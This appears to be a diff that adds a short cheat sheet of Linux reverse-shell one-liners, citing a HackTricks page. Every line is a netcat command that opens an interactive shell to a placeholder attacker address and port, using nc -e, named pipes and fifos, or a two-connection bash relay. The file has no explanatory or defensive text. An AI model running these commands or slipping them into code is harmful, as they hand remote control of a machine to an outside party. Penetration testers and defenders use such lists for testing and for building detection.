@@ -1,0 +1,7 @@
+#Ref: https://book.hacktricks.xyz/generic-methodologies-and-resources/shells/linux
+
+nc -e /bin/sh <ATTACKER-IP> <PORT>
+nc <ATTACKER-IP> <PORT> | /bin/sh #Blind
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <ATTACKER-IP> <PORT> >/tmp/f
+nc <ATTACKER-IP> <PORT1>| /bin/bash | nc <ATTACKER-IP> <PORT2>
+rm -f /tmp/bkpipe;mknod /tmp/bkpipe p;/bin/sh 0</tmp/bkpipe | nc <ATTACKER-IP> <PORT> 1>/tmp/bkpipe
